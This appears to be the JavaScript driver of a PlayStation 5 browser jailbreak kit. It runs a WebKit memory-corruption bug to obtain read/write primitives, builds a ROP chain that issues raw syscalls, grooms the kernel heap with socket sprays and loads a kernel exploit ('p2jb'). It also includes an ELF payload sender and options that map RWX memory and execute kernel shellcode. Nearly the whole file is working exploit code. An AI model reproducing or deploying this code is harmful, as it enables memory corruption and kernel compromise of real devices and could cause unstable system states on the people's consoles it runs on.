<script>(function () {
    var pending = [];
    window.__jbEarly = pending;
    function raw(tag, text) {
        var line = "a0-rboot-s" + (pending.length + 1) + "-note-" + tag
            + "-" + String(text).replace(/[^A-Za-z0-9_.:=,+-]/g, "_").slice(0, 160);
        pending.push(line);
        /* Same hazard as flushMark: this is the EARLY bootstrap reporter, so it runs before
           the beacon latch exists. On a static host log/ does not exist and a 404 does not
           throw, so each early error blocked the main thread on a full internet round trip,
           unlatched. Latch it here too - the on-screen #early log is unaffected and is the
           readout that actually matters when the page is served remotely. */
        if (!window.__earlyBeaconOff) {
            try {
                var x = new XMLHttpRequest();
                x.open("GET", "log/" + encodeURIComponent(line), false);
                x.send();
                if (x.status && (x.status < 200 || x.status >= 300))
                    window.__earlyBeaconOff = true;
            } catch (e) { window.__earlyBeaconOff = true; }
        }
        try {
            var d = document.getElementById("early");
            if (d) d.textContent += line + "\n";
        } catch (e) { }
    }
    window.__jbRaw = raw;
    window.alert = function (m) { raw("ALERT-INTERCEPTED", m); };
    window.confirm = function (m) { raw("CONFIRM-INTERCEPTED", m); return false; };
    window.addEventListener("error", function (e) {
        raw("WINDOW-ERROR", (e && e.message) + "@" + (e && e.filename)
            + ":" + (e && e.lineno));
    });
    window.addEventListener("unhandledrejection", function (e) {
        raw("UNHANDLED-REJECTION",
            e && e.reason && (e.reason.message || e.reason));
    });
})();

// DOM-only (no XHR) so it is cheap enough to call every feed iteration.
//
// WHY THIS IS A TICKER AND NOT JUST A FUNCTION.
// The old version only ever repainted when p2jb CALLED it. Two phases do not call it in
// their loop, so the whole readout - including the elapsed clock - sat frozen:
//   DRAIN    one call with a hardcoded pct=100, then 8-10 minutes of silence while the

    const r = await sys(0x1E7, K.CPU_LEVEL_WHICH, K.CPU_WHICH_TID,
        new int64(0xffffffff, 0xffffffff), K.CPUSET_SIZE, m.ptr);
    if (r.failed)
        throw new Error("cpuset_getaffinity failed (" + r.errText
            + "). Refusing to pin anything blind.");
    const bytes = new Uint8Array(K.CPUSET_SIZE);
    for (let i = 0; i < K.CPUSET_SIZE; ++i) bytes[i] = m.u8[i];
    const word = r32(bytes, 0);
    driver.origMaskBytes = bytes;
    driver.origMaskHex = hexBytes(bytes, 0, K.CPUSET_SIZE);
    flushMark("INHERITED-MASK", "mask=0x" + word.toString(16) + "-cores="
        + coreList(word) + "-bytes=" + driver.origMaskHex);
    if (word === 0)
        throw new Error("the inherited affinity mask is 0");
    let core = -1;
    if (CORE_OVERRIDE >= 0) {
        if (CORE_OVERRIDE > 15 || ((word >>> CORE_OVERRIDE) & 1) === 0)
            throw new Error("?core=" + CORE_OVERRIDE + " is not set in the "
                + "inherited mask 0x" + word.toString(16) + " (available: "
                + coreList(word) + "). cpuset_setaffinity would fail and every "
                + "test below would still appear to work.");
        core = CORE_OVERRIDE;
        driver.coreWhy = "chosen explicitly with ?core=" + CORE_OVERRIDE
            + " and confirmed present in the inherited mask";
    } else {
        for (let i = 15; i >= 0; --i) if ((word >>> i) & 1) { core = i; break; }
        driver.coreWhy = "the highest core set in the INHERITED mask 0x"
            + word.toString(16) + " (available: " + coreList(word) + "). "
            + "Derived, not hardcoded: poops.c:52 uses 5 and p2jb.js:193 uses "
            + "4, and neither exists here.";
    }
    if (core < 0 || core > 15)
        throw new Error("no usable core in 0..15 from mask 0x" + word.toString(16));
    driver.core = core;
    flushMark("CORE-CHOSEN", "core=" + core);
    return core;
}

let engine = null;
let LADDER = [];
let currentKey = "";
let ctx = null;


/* WEBKIT-ONLY SENDER.
 *
 * The payload menu can be reached without running the exploit in this page - via
 * ?payloads=1, or a jailbreak recorded earlier in this browser session. Those paths
 * called showWin() immediately, so the page had no WebKit primitive and therefore no
 * syscalls, and window.__sendElfDirect (exported inside makePoopsEngine) was never
 * defined. Measured on a live run:
 *
 *     ELFDIRECT-PROBE <name> typeof=undefined
 *     PAYLOAD-RESULT  FAILED - server reported failure
 *
 * Every ELF ever delivered went through api/payload/ instead, which exists only on
 * ps-exploit-host and ps5dbg. GitHub Pages has no such route, so on a static host the
 * tiles could not work at all.
 *
 * Bringing up the primitive and the engine (NOT the kernel exploit) is enough: the
 * sender needs only socket/connect/write/mmap, which the ROP chain provides. Same split
 * zecoxao/slopdev exposes as its "Webkit-only (sender)" button.
 *
 * Firmware-agnostic: it runs the same boot path a normal run uses, so it covers every
 * firmware the page already supports - poopsploit 9.00-12.00 and p2jb 12.00-12.70.
 *
 * Failure is not fatal - the menu still opens and falls back to api/payload, which is
 * exactly today's behaviour.
 */
async function wkOnlySender(why) {
    try {
        stage("payload menu (" + why + ") -- bringing up the WebKit primitive so the console can send ELFs itself");
        flushMark("WK-ONLY-SENDER", "begin-why=" + why);
        await bootChain();
        makeContext();
        const ok = (typeof window.__sendElfDirect === "function");
        flushMark("WK-ONLY-SENDER", "ready typeof=" + (typeof window.__sendElfDirect)
            + "-direct=" + ok);
        stage(ok ? "in-console sender ready -- tiles work without a server helper"
                 : "sender unavailable -- tiles will use the server helper", ok ? "ok" : "");
    } catch (e) {
        const w = String((e && e.message) || e).slice(0, 120);
        flushMark("WK-ONLY-SENDER", "FAILED-" + w.slice(0, 80));
        try { stage("primitive setup failed (" + w + ") -- menu will use the server helper", "bad"); } catch (_) { }
    }
    showWin();
}

function makeContext() {
    ctx = {
        P, chain, i64: (lo, hi) => new int64(lo, hi),
        sys, runChain, mem, flushMark, queueEvent, sleep, note, PASS, FAIL, NA,
        track, untrack, state, cfg, latch, stage, driver,
        WATCHDOG_MS, setChainMarksQuiet,

        setRaceMode, repaintScreen,

        markStats, flushQueue, verdictBanner,
        chainDeadNow: () => !!chainDead,
        measured: {},
        stalledAt: STALLED_AT, lastRun: LAST_RUN,
        filteredRun: FILTERED_RUN, only: ONLY.slice(), from: FROM
    };
    engine = makePoopsEngine(ctx);
    engine.setFamily(cfg.trigger);
    return ctx;
}

let cleanupClaimed = false;

async function runLadder() {
    const X = ctx;
    LADDER = buildLadder(X, engine);

    let passed = 0, failed = 0, skipped = 0, filtered = 0;
    let started = false, aborted = "";

    for (let i = 0; i < LADDER.length; ++i)
        row(i + 1, LADDER[i], "SKIP", "queued");

    for (let i = 0; i < LADDER.length; ++i) {
        const entry = LADDER[i];

        if (entry.key === "ps7_report") continue;
        if (ONLY.length && ONLY.indexOf(entry.key) < 0) {
            filtered++;
            row(i + 1, entry, "SKIP", "not in ?only=");
            continue;
        }
        if (!ONLY.length && FROM && !started) {
            if (entry.key !== FROM) {
                filtered++;
                row(i + 1, entry, "SKIP", "before ?from=" + FROM);
                continue;
            }
            started = true;
        }
        if (state.cleanupFailed) {
            skipped++;
            row(i + 1, entry, "SKIP", "REFUSED -- an earlier step could not "
                + "clean up: " + state.cleanupFailed);
            continue;
        }
        if (chainDead) {
            skipped++;
            row(i + 1, entry, "SKIP", "chain unusable after '" + chainDead
                + "'. Even the teardown is a chain round trip.");
            continue;
        }

        storeSet(PROGRESS_KEY, entry.key);
        currentKey = entry.key;
        currentNotes = [];
        row(i + 1, entry, "RUN", "running...");
        flushMark("TEST-ENTER", entry.key
            + (entry.hot ? "-chainMarks=queued" : "-chainMarks=blocking"));
        let result;
        const wasQuiet = setChainMarksQuiet(!!entry.hot);
        try {
            result = await entry.run();
            if (!result) result = FAIL("the test returned nothing");
        } catch (err) {
            const m = (err && err.message) || String(err);
            if (m === "WATCHDOG") {
                aborted = entry.key;
                result = FAIL("WATCHDOG: no reply from the ROP worker in "
                    + WATCHDOG_MS + " ms. launch_chain has no timeout of its "
                    + "own (main.js:393-399).");
            } else {
                result = FAIL("THREW " + (err && err.name) + ": " + m.slice(0, 400));
            }
        } finally {
            setChainMarksQuiet(wasQuiet);
        }
        if (result.status === "PASS") passed++;
        else if (result.status === "SKIP") skipped++;
        else failed++;
        row(i + 1, entry, result.status, result.detail, currentNotes);
        flushMark("TEST", entry.key + "-" + result.status
            + (result.detail
                ? "-why=" + String(result.detail).replace(/[\r\n\t]+/g, " ")
                    .replace(/[^\x20-\x7e]/g, "").slice(0, 400)
                : ""));
        if (state.cleanupFailed) danger("cleanup failure: " + state.cleanupFailed);

        if (aborted || result.status === "FAIL") {
            if (!aborted) aborted = entry.key + " (FAIL)";
            for (let k = i + 1; k < LADDER.length; ++k) {
                if (LADDER[k].key === "ps7_report") continue;
                skipped++;
                row(k + 1, LADDER[k], "SKIP", "REFUSED after '" + entry.key
                    + "' failed");
            }
            break;
        }
    }

    let reportRow = null;
    for (const e of LADDER) if (e.key === "ps7_report") reportRow = e;
    const reportIdx = reportRow ? LADDER.indexOf(reportRow) + 1 : 0;
    let reportResult = null;
    if (reportRow && chainDead) {
        skipped++;
        row(reportIdx, reportRow, "SKIP", "IMPOSSIBLE -- the chain died at '"
            + chainDead + "'");
    } else if (reportRow && !engine) {
        skipped++;
        row(reportIdx, reportRow, "SKIP", "no engine was built");
    } else if (reportRow && !cleanupClaimed) {
        cleanupClaimed = true;
        currentKey = "ps7_report";
        currentNotes = [];
        flushMark("TEST-ENTER", "ps7_report-forced");
        try {
            reportResult = await reportRow.run();
        } catch (err) {
            reportResult = FAIL("PS7 THREW: " + ((err && err.message) || err));
        }
        row(reportIdx, reportRow, reportResult.status, reportResult.detail,
            currentNotes);
        if (reportResult.status === "PASS") passed++; else failed++;
        flushMark("TEST", "ps7_report-" + reportResult.status);
    }

    let stranded = [];
    const noClose = (engine && engine.S && engine.S.doNotClose)
        ? engine.S.doNotClose : new Set();
    const sweepBlocked = engine && engine.corrupt ? "alias-present"
        : (engine && engine.triggered ? "trigger-fired"
            : (chainDead ? "chain-dead"
                : (state.cleanupFailed ? "cleanup-failed"
                    : ((engine && engine.S && engine.S.groupsStillLive.length)
                        ? "racer-group-still-parked" : ""))));
    const sweepable = Array.from(state.fdOpen).filter(fd => !noClose.has(fd));
    if (sweepable.length && !sweepBlocked) {
        for (const fd of sweepable) {
            try { await sys(0x006, fd); } catch { }
            state.fdOpen.delete(fd);
        }
        flushMark("FD-SWEEP", "closed=" + sweepable.length + "-skipped="
            + noClose.size + "-fds=" + sweepable.slice(0, 24).join("."));
    } else if (sweepable.length) {
        flushMark("FD-STRANDED", "n=" + sweepable.length + "-why=" + sweepBlocked
            + "-fds=" + sweepable.slice(0, 24).join("."));
    }

    const strandSet = new Set(noClose);
    for (const fd of state.fdOpen) strandSet.add(fd);
    stranded = Array.from(strandSet);
    if (noClose.size)
        flushMark("FD-DO-NOT-CLOSE", "n=" + noClose.size + "-fds="
            + Array.from(noClose).slice(0, 24).join("."));

    currentKey = "";

    const rt = state.roundTrips;
    const rtMean = rt.length
        ? Math.round(rt.reduce((a, b) => a + b, 0) / rt.length * 10) / 10 : -1;
    const rtMax = rt.length ? Math.max.apply(null, rt) : -1;

    tallyEl.textContent = passed + " PASS   " + failed + " FAIL   "
        + skipped + " SKIP" + (filtered ? "   " + filtered + " FILTERED" : "");
    tallyEl.style.color = failed ? "#e05561" : "#47c76a";

    const v = (ctx.measured && ctx.measured.verdict) || null;
    const mustReboot = v ? !!v.reboot : true;
    const lines = [];
    lines.push("rows: " + LADDER.length + " = " + passed + " pass + " + failed
        + " fail + " + skipped + " skip + " + filtered + " filtered");
    if (engine) {
        lines.push("TRIGGER: " + cfg.trigger
            + (cfg.trigger === "overflow" ? " (burn=" + cfg.burn + ")" : "")
            + "   |   fired: " + (engine.triggered ? "YES -- " + engine.triggered
                : "no")
            + "   |   alias observed: " + (engine.corrupt ? "YES" : "no")
            + "   |   triplet: " + (engine.TW.tripletsValid()
                ? engine.TW.S.triplets.join(",") : "none"));
        lines.push("crfrees issued: " + engine.S.crfrees
            + "   |   setuid(1) calls: " + engine.S.setuidCalls
            + "   |   kread_slow: " + engine.S.kreadOk + " ok of "
            + engine.S.kreadCalls
            + "   |   kqueues opened/closed: " + engine.S.kqueuesOpened + "/"
            + engine.S.kqueuesClosed
            + "   |   kernel writes: " + engine.kernelWrites);
        if (engine.S.masterPipeData)
            lines.push("STAGE 2 OUTPUT (printed and discarded; stage 3's input, " + "and stage 3 is not built): master_pipe and victim_pipe are " + "in the PS6 row above and in the beacon log");
    }
    if (ctx && ctx.measured.rt)
        lines.push("MEASURED chain.run(): " + ctx.measured.rt.a.toFixed(2)
            + " ms fixed + " + (ctx.measured.rt.b * 1000).toFixed(1)
            + " us per in-chain syscall.");
    if (ctx && ctx.measured.stage0)
        lines.push("STAGE 0: " + ctx.measured.stage0.attempts + " attempts in "
            + ctx.measured.stage0.ms + " ms = "
            + (ctx.measured.stage0.ms
                / Math.max(1, ctx.measured.stage0.attempts)).toFixed(0)
            + " ms/attempt.");
    lines.push("chain round trips: " + rt.length + ", mean " + rtMean
        + " ms, worst " + rtMax + " ms; one-at-a-time syscalls " + syscallCount
        + "; errno convention (measured): " + errConvention);
    lines.push("threads: " + state.threadsCreated + " created, "
        + state.threadsExited + " confirmed exited"
        + (state.tornWrites.length
            ? "; torn slot writes: " + state.tornWrites.join(",") : ""));
    if (stranded.length)
        lines.push("descriptors left open on purpose ("
            + (sweepBlocked ? "sweep blocked: " + sweepBlocked + "; " : "")
            + noClose.size + " named by cleanup as do-not-close, "
            + state.fdOpen.size + " still tracked): "
            + stranded.join(",") + "");
    if (teleDropped)
        lines.push("telemetry loss: " + teleDropped + " queued beacon lines "
            + "were dropped.");
    lines.push("not built, DELIBERATELY: stage 3 and everything after it");
    if (aborted) lines.push("run stopped at '" + aborted + "'.");
    if (FILTERED_RUN)
        lines.push("this was A filtered pass ("
            + (ONLY.length ? "?only=" + ONLY.join(",") : "?from=" + FROM)
            + "). It can only account for what IT did.");
    summaryEl.textContent = lines.join("\n");

    flushMark("POOPS-COMPLETE", "pass=" + passed + "-fail=" + failed
        + "-skip=" + skipped + "-reboot=" + (mustReboot ? 1 : 0)
        + "-triggered=" + (engine && engine.triggered ? 1 : 0)
        + "-rtmean=" + rtMean + "-filtered=" + (FILTERED_RUN ? 1 : 0));

    if (mustReboot) {
        showVerdict(true, (v ? v.text : "reboot now -- the state report and "
            + "cleanup row (PS7) never ran"
            + (chainDead ? ", because the ROP chain died at '" + chainDead
                + "'"
                : ", so nothing has been verified and this page cannot claim "
                + "anything was put back."))
            + "\n\nREBOOT NOW"
            + (v && v.all.length > 1
                ? "\n\nAll reasons:\n  - " + v.all.join("\n  - ") : ""));
    } else {

        const ver = (v && v.verified) || {};
        showVerdict(false, "you are fine -- nothing was triggered and " + "everything this page can check was put back.\n"
            + (ver.teardown ? "freed and closed socket by socket"
                : "teardown had nothing to do")
            + "; racers " + (ver.racers ? "confirmed exited" : "NOT confirmed")
            + "; scheduler affinity "
            + (ver.schedAff ? "read back" : "NOT read back")
            + " and priority " + (ver.schedPrio ? "read back" : "NOT read back")
            + "; descriptors left open on purpose: " + stranded.length
            + "; kernel writes: " + (ver.kernelWrites === undefined
                ? "0" : ver.kernelWrites) + ".");
    }

    const finalLatch = await latch.read();
    if (!mustReboot && !failed && !aborted && !FILTERED_RUN && !stranded.length
        && !chainDead && !state.cleanupFailed) {
        const l = await latch.clear();
        flushMark("LATCH-RELEASED", "set=" + (l.set ? 1 : 0));
        lines.push("one-shot latch RELEASED: this run put everything back and "
            + "verified it.");
    } else {
        flushMark("LATCH-HELD", "reboot=" + mustReboot + "-failed=" + failed
            + "-aborted=" + (aborted || "no") + "-filtered=" + FILTERED_RUN);
        lines.push("ONE-shot latch still held"
            + (finalLatch.set ? "" : " (or never took)")
            + "");
    }
    summaryEl.textContent = lines.join("\n");

    if (!aborted && !FILTERED_RUN) storeDel(PROGRESS_KEY);
    storeSet(RUNLOG_KEY, JSON.stringify({
        v: 1, rev: REV, ts: Date.now(),
        trigger: cfg.trigger, burn: cfg.burn,
        stoppedAt: aborted || "", filtered: FILTERED_RUN,
        pass: passed, fail: failed, skip: skipped,
        reboot: mustReboot,
        triggered: engine ? engine.triggered : "",
        corrupt: engine ? engine.corrupt : "",
        triplets: engine && engine.TW.tripletsValid()
            ? engine.TW.S.triplets.join(",") : "",
        setuidCalls: engine ? engine.S.setuidCalls : 0,
        socketsLeft: engine ? engine.TW.S.n : 0,
        chainDead: chainDead, cleanupFailed: state.cleanupFailed,
        latchDetail: (finalLatch && finalLatch.detail) || ""
    }));

    if (mustReboot)
        stage("reboot required -- " + passed + " PASS / " + failed + " FAIL", "bad");
    else if (failed || aborted)
        stage("FAILED -- " + passed + " PASS / " + failed + " FAIL", "bad");
    else
        stage("stages 0-2 complete, nothing triggered, everything put back -- "
            + passed + " PASS", "ok");
}

async function bootChain() {
    const bootTimer = setTimeout(() => {
        flushMark("BOOT-STALLED", "ms=45000-stage=boot-nothing-changed-yet");
        stage("boot is taking more than 45 s");
    }, 45000);
    try {
        stage("preflight");
        await preflight();
        refuseReferenceChain();
        await bootPrimitiveAndChain();
    } finally {
        clearTimeout(bootTimer);
    }
}

async function bootPrimitiveAndChain() {
    if (globalThis.p && typeof globalThis.p.read8 === "function") {
        flushMark("PRIMITIVE-REUSED", "window.p was already published");
    } else if (typeof window.jbReady === "object" && window.jbReady !== null
        && typeof window.jbReady.then === "function") {
        stage("waiting for the primitive");
        await window.jbReady;
        flushMark("PRIMITIVE-REUSED", "via-window.jbReady");
    } else if (typeof window.run_slopkit === "function") {
        stage("running slopkit's deserializer bug through window.run_slopkit");
        await window.run_slopkit(window.fw_str);
        flushMark("PRIMITIVE-REUSED", "via-window.run_slopkit");
    } else {
        stage("running the webkit bug -- placement is ~1 attempt in 3, it "
            + "retries itself");

        // A killed/reloaded WebProcess can restore this history entry with the
        // previous 65k-object SerializedScriptValue graph still attached.  If
        // we build the next graph before releasing it, 9.00 can hit its memory
        // ceiling almost immediately.  Purge it before any exploit allocation.
        flushMark("PRIMITIVE-HISTORY-PURGE-PRE", "replace-state-null");
        try {
            history.replaceState(null, "");
        } catch (e) {
            flushMark("PRIMITIVE-HISTORY-PURGE-FAIL",
                (e && e.name ? e.name : "Error") + ":" + String(e && e.message || e));
            throw e;
        }
        if (typeof globalThis.gc === "function") {
            try { globalThis.gc(); } catch (e) { }
        }
        await new Promise(resolve => setTimeout(resolve, 750));
        flushMark("PRIMITIVE-HISTORY-PURGED", "settled-ms=750");

        const carrier = await establishPrimitive({
            maxAttempts: MAX_ATTEMPTS,
            onEvent(tag, detail, attempt) {
                beaconAttempt = attempt;
                if (tag === "ATTEMPT-START") {
                    // This is before the large graph is built, so make the
                    // checkpoint durable if the WebProcess dies during setup.
                    flushMark(tag, detail);
                    stage("exploit attempt " + attempt + " -- waiting for placement");
                } else {
                    queueEvent(tag, detail);
                }
            },
            beforeCriticalLoad(fake, target) {
                queueEvent("CRITICAL-LOAD-NEXT", "fake=0x" + fake.toString(16)
                    + "-target=0x" + target.toString(16));
                void scrEl.offsetWidth;
                flushQueue(false);
            }
        });
        beaconAttempt = carrier.attempts;
        nogcHard.carrier = carrier;
        installWindowP(carrier, { onEvent: queueEvent });
        // installWindowP() promotes the primitive to a self-contained pair of
        // real typed arrays.  Keeping the obsolete fake carrier here defeats
        // core.js's release and can retain the 72 MB addrof carrier graph.
        nogcHard.carrier = null;
        if (typeof globalThis.gc === "function") {
            try { globalThis.gc(); } catch (e) { }
        }
        // Give JSC an idle turn to reclaim the released carrier/groom before
        // prepare() creates its worker ROP stack and the kernel-stage arenas.
        await new Promise(resolve => setTimeout(resolve, 1000));
        flushMark("PRIMITIVE-MEMORY-RELIEF",
            "fake-carrier-dropped=1-history-state-null="
            + (history.state === null));
        // the image is decoded into the renderer heap; loading it before the
        // groom changes the layout placement depends on
        try { document.getElementById("cat").src = "mmhmm-cats-ps5.gif"; } catch (e) { }
        // (win/fail gifs are preloaded statically at page load -- see body top --
        //  deliberately NOT here, to avoid perturbing the exploit heap mid-groom.)
        flushMark("PRIMITIVE-UP", "attempt=" + carrier.attempts
            + "-paired=" + pairStatus.promoted
            + "-released=" + fakeCellReleased());
        if (!pairStatus.promoted)
            throw new Error("the (main, worker) pair was NOT promoted ("
                + pairStatus.error + ")");
    }

    const p = globalThis.p;
    if (!p || typeof p.read8 !== "function")
        throw new Error("window.p was never published");
    nogcHard.p = p;
    assertInt64Identity();

    stage("loading poops_lib / threads_lib / twin_lib / poops_stages");
    await loadPoopsModules();

    const handoff = window.jbPrepared || null;
    let prepared;
    if (handoff && handoff.chain && handoff.p
        && typeof handoff.chain.syscall === "function"
        && handoff.p.syscalls !== undefined) {
        prepared = handoff;
        flushMark("CHAIN-REUSED", "window.jbPrepared");
    } else {
        stage("prepare(): module bases, gadget/syscall tables, worker hijack");
        flushMark("PREP-ENTER", "");
        prepared = await prepare(p);
        flushMark("PREP-OK", "getpid-passed-inside-prepare");
    }
    P = prepared.p;
    chain = prepared.chain;
    nogcHard.chain = chain;

    flushMark("POST-PREP", "next=assertBases");
    assertBases();
    await probeErrnoConvention();
}

async function main() {
    flushMark("POOPS-BOOT", "rev=" + REV + "-trigger=" + cfg.trigger
        + "-burn=" + cfg.burn + "-sockets=" + cfg.sockets
        + "-attempts=" + cfg.attempts + "-from=" + (FROM || "none")
        + "-only=" + (ONLY.join(".") || "none")
        + "-stalledAt=" + (STALLED_AT || "none"));
    lockNav(true);
    runInFlight = true;
    try {
        await bootChain();

        // ---- P2JB handoff ------------------------------------------------
        // bootChain() -> prepare() published window.POOPS. Run the p2jb kernel
        // exploit (Y2JB-shape) on poopsploit primitives instead of poops's own
        // engine. Adapter first (defines syscall/ROP/read/write/SYSCALL/...),
        // then p2jb.js (self-invoking async IIFE, starts on load).
        {
            const loadScript = (src) => new Promise((res, rej) => {
                const s = document.createElement("script");
                s.src = src; s.onload = () => res(1);
                s.onerror = () => rej(new Error("load " + src));
                document.body.appendChild(s);
            });
            try {
                if (!window.POOPS) throw new Error("window.POOPS not published by prepare()");
                await loadScript("rop-worker.js?v=130");   // sync syscall executor (fireSync)
                await loadScript("p2jb_lk.js?v=130");       // per-fw libkernel_web offsets for rop-worker
                await loadScript("p2jb_poops.js?v=130");    // Y2JB adapter (sync syscall via rop-worker)
                await loadScript("p2jb.js?v=130");          // exploit module (unchanged, sync)
                flushMark("P2JB-LOADED", "adapter+module on poopsploit primitives");
            } catch (e) {
                /* This reported ONLY through flushMark. Served from a static host there is no
                   server log, so a failure here was completely invisible: the run reached the
                   primitive (the cat gif is set just before this) and then stopped with nothing
                   on screen. Put the reason where it can always be read. */
                const why = String((e && e.message) || e).slice(0, 160);
                flushMark("P2JB-LOAD-FAIL", why.slice(0, 100));
                try { stage("P2JB LOAD FAILED: " + why, "bad"); } catch (e2) { }
                try { screenMark("P2JB-LOAD-FAIL", why); } catch (e2) { }
            }
            /* Publish the in-console ELF sender before bailing out.
               makePoopsEngine() is what exports window.__sendElfDirect, and it only runs
               inside makeContext() - which sits BELOW this early return, on poops's own
               ladder. So on a p2jb run the payload tiles had no direct sender and fell
               back to fetch("api/payload/<name>"). That route exists on ps-exploit-host,
               which is why this was invisible locally, but a static host such as GitHub
               Pages answers 404 -> the handler throws -> every tile goes red WITHOUT
               sending anything. poopsploit was unaffected because its run reaches
               makeContext() normally.
               makeContext() is pure construction - it builds a ctx of existing references,
               calls the makePoopsEngine factory and setFamily(). It runs no exploit code,
               writes no kernel memory and is not async, so it is safe here.
               Firmware-independent: this branch is not version-gated, so the bug and the
               fix apply identically to 12.00/12.02/12.20/12.40/12.60/12.70.
               Non-fatal by design: on failure the tiles simply fall back to api/payload,
               which is exactly the old behaviour. */
            try { makeContext(); }
            catch (e) {
                flushMark("P2JB-SENDER", "makeContext-failed-"
                    + String((e && e.message) || e).slice(0, 60));
            }
            runInFlight = false;
            return; // do NOT run poops's own kernel engine below
        }

        await chooseCore();

        makeContext();
        const self = await engine.H.thrSelf("driver");
        driver.tid = self.tid;
        const r0 = await engine.H.readRtprio("driver-original");
        driver.origPrioType = r0.type;
        driver.origPrio = r0.prio;
        const pid = await sys(0x014);
        driver.pid = pid.failed ? 0 : pid.s32;
        flushMark("DRIVER-IDENTITY", "pid=" + driver.pid + "-tid=" + driver.tid
            + "-mask=" + driver.origMaskHex + "-rtprio=" + driver.origPrioType
            + "/" + driver.origPrio + "-core=" + driver.core);

        flushMark("PRE-FD-BASELINE", "next=socket(AF_UNIX,SOCK_STREAM)");
        const first = await sys(0x061, K.AF_UNIX, K.SOCK_STREAM, 0);
        if (!first.failed) {
            state.fdBaseline = first.s32;
            await sys(0x006, state.fdBaseline);
        }
        flushMark("FD-BASELINE", "fd=" + state.fdBaseline);

        vitals(vitalsText("about to open "));
        cfgEl.textContent =
            "trigger: " + cfg.trigger
            + (cfg.trigger === "overflow" ? "   burn: " + cfg.burn : "")
            + "   |   stage-0 attempts: " + cfg.attempts
            + "   |   twin scan: " + (PK ? PK.MAX_ROUNDS_TWIN : 10)
            + " rounds at BATCH 1 (twin_lib REFUSES batch>1 once a trigger "
            + "exists)\n"
            + "spray bank: " + cfg.sockets + " AF_INET6 sockets x 360-byte "
            + "type-0 routing header (poops.c:38, :45)\n"
            + "target core " + driver.core + " -- " + driver.coreWhy + "\n"
            + "driver tid " + (driver.tid || "unknown") + " in pid " + driver.pid
            + "; will put back mask " + driver.origMaskHex + " and rtprio "
            + driver.origPrioType + "/" + driver.origPrio + "\n" + "chain watchdog " + WATCHDOG_MS + " ms per round trip; every loop " + "on this page is bounded by an iteration count AND a wall clock, " + "and every wait has a deadline.\n";

        stage("running the ladder -- one row at a time");
        try {
            await runLadder();
            if (!window.__won) showFail();   // ladder finished without a jailbreak -> 3.gif
        } finally {
            if (chainDead)
                danger("cleanup impossible: the ROP chain died at '" + chainDead
                    + "'.\nUp to " + (engine ? engine.TW.S.n : 0) + " AF_INET6 "
                    + "sockets, their 360-byte kernel routing headers, twelve "
                    + "realtime kernel threads pinned to core " + driver.core
                    + ", and this WebProcess's raised fd limit are all still " + "live, and NOTHING in a later page load can reach a " + "descriptor or a thread in a process it does not own"
                    + (driver.tid
                        ? "\nThe driver thread is tid " + driver.tid + " in pid "
                        + driver.pid + " and that has been written down: a " + "later load CAN restore its affinity and priority by " + "explicit TID"
                        : "")
                    + "\nREBOOT.");
        }
    } finally {
        runInFlight = false;
        lockNav(false);
    }
}

async function clearMain() {
    const before = await latch.read();
    const after = await latch.clear();
    stage(before.set
        ? "one-shot latch CLEARED. It was set by: " + (before.detail || "?")
        : "the latch was not set; nothing to clear.", "ok");
    summaryEl.textContent =
        "before: " + JSON.stringify(before) + "\nafter:  " + JSON.stringify(after)
        + (ARMED ? "\n\n?go=1 was present on this URL and was IGNORED: ?clear=1 "
            + "is checked first and returns." : "")
        + "\n\nNOTHING else was done";
    renderNav(STALLED_AT, false);
}

function renderNav(stalled, latched) {
    navEl.textContent = "";

    if (latched) {
        link("?clear=1", "I have rebooted  --  clear latch", "one");
    } else if (stalled) {
        const bq0 = cfg.trigger === "overflow" ? "&burn=" + cfg.burn : "";
        link("?go=1&trigger=" + cfg.trigger + bq0
            + "&from=" + encodeURIComponent(stalled),
            "resume at  " + stalled, "one");
    } else if (!ARMED) {
        // Only offer START when the page is NOT already armed. When a run is in flight this
        // rendered a big red "START" under the live status for the whole ~65 minutes, which
        // reads as a failure banner rather than an offer to begin something already begun.
        link("?trigger=netcontrol",
            "START  --  poops stage 0 / 1 / 2", "one");
    }
    if (stalled) {

        const bq = cfg.trigger === "overflow" ? "&burn=" + cfg.burn : "";

        link("?go=1&trigger=" + cfg.trigger + bq + "&only=" + encodeURIComponent(stalled),
            "run only  " + stalled, "extra");
    }
    link("?go=1", "run all -- negative control (trigger=none)", "extra");

    link("?trigger=netcontrol&payload=dry",
        "START + STAGE 5 dry run  (prepares the payload, runs nothing)",
        "extra");
    link("?trigger=netcontrol&payload=1",
        "START + run the payload  (maps RWX and EXECUTES the kexp shellcode)",
        "extra hot");

    link("?go=1&only=ps0_preflight",
        "PS0 ONLY  (preflight + budget, no kernel state)", "extra");
    link("?go=1&only=ps0_preflight&netprobe=1",
        "PS0 + netcontrol reachability probe", "extra");
    link("?go=1&trigger=overflow&burn=probe",
        "OVERFLOW, burn=probe  (measures kqueueex; no setuid, no burn, no "
        + "free-fd pool -- stage 0 REFUSES rather than arming)", "extra");

    link("?trigger=netcontrol",
        "netcontrol trigger...  (shows what it does; does NOT arm)", "extra hot");
    link("?trigger=overflow&burn=full",
        "overflow trigger, full burn...  (shows what it does; does NOT arm)",
        "extra hot");
    link("twin.html?go=1", "twin machinery (step 4)", "extra");
    link("threads.html?go=1", "threading (step 3)", "extra");
    link("index.html", "back to slopkit", "extra");
}

function lastRunText() {
    if (!LAST_RUN) return "";
    const age = Math.round((Date.now() - (LAST_RUN.ts || 0)) / 1000);
    return "\nLAST recorded run (" + age + " s ago, trigger=" + LAST_RUN.trigger
        + "): " + (LAST_RUN.stoppedAt ? "stopped at '" + LAST_RUN.stoppedAt + "'"
            : "completed")
        + ", " + LAST_RUN.pass + " pass / " + LAST_RUN.fail + " fail"
        + (LAST_RUN.reboot ? "\n  that run'S verdict was: REBOOT." : "")
        + (LAST_RUN.triggered ? "\n  the trigger fired: " + LAST_RUN.triggered
            : "")
        + (LAST_RUN.corrupt ? "\n  an alias was observed: " + LAST_RUN.corrupt
            : "")
        + (LAST_RUN.triplets ? "\n  triplet established: " + LAST_RUN.triplets
            : "")
        + (LAST_RUN.setuidCalls ? "\n  setuid(1) was called "
            + LAST_RUN.setuidCalls + " time(s) -- IRREVERSIBLE for that boot, "
            + "so the trigger's own precondition (a fresh, singly-referenced "
            + "cred) no longer holds in that WebProcess" : "")
        + (LAST_RUN.chainDead ? "\n  chain died at '" + LAST_RUN.chainDead + "'"
            : "")
        + (LAST_RUN.latchDetail ? "\n  latch detail recorded by that run: "
            + LAST_RUN.latchDetail : "");
}

(async function entry() {

    // P2JB: bypass REMOVED. The working telegram build auto-runs the ORIGINAL poops
